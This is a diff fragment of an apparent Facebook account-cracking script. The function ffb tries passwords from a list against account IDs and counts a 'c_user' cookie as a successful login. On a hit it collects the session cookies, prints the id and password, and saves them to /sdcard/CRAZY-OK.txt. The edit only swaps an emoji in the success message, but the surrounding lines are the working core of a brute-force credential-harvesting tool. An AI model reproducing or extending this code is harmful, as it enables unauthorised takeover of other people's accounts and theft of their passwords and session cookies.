@@ -467,7 +467,7 @@ def ffb(ids,names,passlist):
                         if "c_user" in Crazy:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [CRAZY-🥰] %s | %s'%(ids,pas))
+                                print('\r\r\033[1;32m [CRAZY-💚] %s | %s'%(ids,pas))
                                 open('/sdcard/CRAZY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
